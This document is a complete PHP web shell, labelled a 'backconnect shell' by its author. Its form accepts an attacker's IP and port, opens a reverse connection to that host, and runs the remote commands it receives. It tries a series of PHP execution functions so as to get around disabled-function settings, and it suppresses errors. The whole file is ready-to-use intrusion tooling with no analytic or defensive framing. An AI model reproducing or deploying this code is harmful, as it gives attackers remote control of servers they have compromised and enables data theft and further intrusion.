<?php
// Advanced PHP Backconnect Shell by SukaJanda01
// Simulasi Shell: mendukung bash, ./, nohup, & dll
set_time_limit(0);
error_reporting(0);

$functions = ['proc_open', 'popen', 'system', 'shell_exec', 'exec', 'passthru'];

function execute($cmd, $cwd) {
    global $functions;
    if (preg_match('/^cd\s+(.*)/', trim($cmd), $m)) {
        $new = trim($m[1]);
        $dir = realpath($cwd . DIRECTORY_SEPARATOR . $new);
        if ($dir && is_dir($dir)) {
            return [$dir, ""];
        } else {
            return [$cwd, "cd: no such directory: $new\n"];
        }
    }

    $full_cmd = "cd \"$cwd\" && $cmd";
    foreach ($functions as $f) {
        if (is_callable($f) && stripos(ini_get('disable_functions'), $f) === false) {
            switch ($f) {
                case 'proc_open':
                    $spec = [
                        0 => ["pipe", "r"],
                        1 => ["pipe", "w"],
                        2 => ["pipe", "w"]
                    ];
                    $process = proc_open($full_cmd, $spec, $pipes);
                    if (is_resource($process)) {
                        $out = stream_get_contents($pipes[1]);
                        $err = stream_get_contents($pipes[2]);
                        fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]);
                        proc_close($process);
                        return [$cwd, $out . $err];
                    }
                    break;
                case 'popen':
                    $fp = popen($full_cmd, 'r');
                    $out = "";
                    while (!feof($fp)) $out .= fread($fp, 1024);
                    pclose($fp);
                    return [$cwd, $out];
                case 'system':
                    ob_start();
                    system($full_cmd);
                    $out = ob_get_clean();
                    return [$cwd, $out];
                case 'shell_exec':
                    return [$cwd, shell_exec($full_cmd)];
                case 'exec':
                    $res = [];
                    exec($full_cmd, $res);
                    return [$cwd, implode("\n", $res)];
                case 'passthru':
                    ob_start();
                    passthru($full_cmd);
                    $out = ob_get_clean();
                    return [$cwd, $out];
            }
        }
    }
    return [$cwd, "No available functions\n"];
}

function backconnect_shell($ip, $port) {
    $sock = fsockopen($ip, $port, $errno, $errstr, 30);
    if (!$sock) return "Connection failed: $errstr";

    $cwd = getcwd();
    fwrite($sock, "Backconnect shell connected.\n");
    fwrite($sock, "Type 'exit' to quit.\n\n");

    while (!feof($sock)) {
        fwrite($sock, "[$cwd]$ ");
        $cmd = fgets($sock, 2048);
        if ($cmd === false) break;

        $cmd = trim($cmd);
        if ($cmd === 'exit') break;

        list($cwd, $out) = execute($cmd, $cwd);
        fwrite($sock, $out);
    }

    fclose($sock);
    return "Disconnected.";
}

echo "<h3>🔧 Backconnect Bash-Like by SukaJanda01</h3>
<form method='post'>
  <input type='text' name='ip' placeholder='Your IP' required>
  <input type='number' name='port' placeholder='Port' required>
  <button type='submit'>Connect</button>
</form>";

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $ip = $_POST['ip'];
    $port = (int) $_POST['port'];
    echo "<pre>" . backconnect_shell($ip, $port) . "</pre>";
}
?>
